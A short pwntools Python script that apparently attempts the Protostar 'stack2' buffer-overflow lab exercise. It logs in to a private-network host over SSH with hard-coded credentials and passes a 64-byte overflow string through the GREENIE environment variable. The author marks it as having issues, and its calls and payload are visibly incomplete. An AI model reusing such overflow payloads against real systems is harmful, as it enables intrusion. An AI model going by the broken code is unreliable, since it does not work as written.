## this script has issues, will fix later
from pwn import *

IP   = '192.168.43.18'
USER = 'user'
PASS = 'user'
PORT = 22


shell = ssh(user=USER,host=IP,port=PORT, password=PASS)
payload = 'A' * 64 + '\n\r\n\r'
process(executable='/opt/protostar/bin/stack2',argv='./stack2', env={'GREENIE': payload})
print(process.recvline())
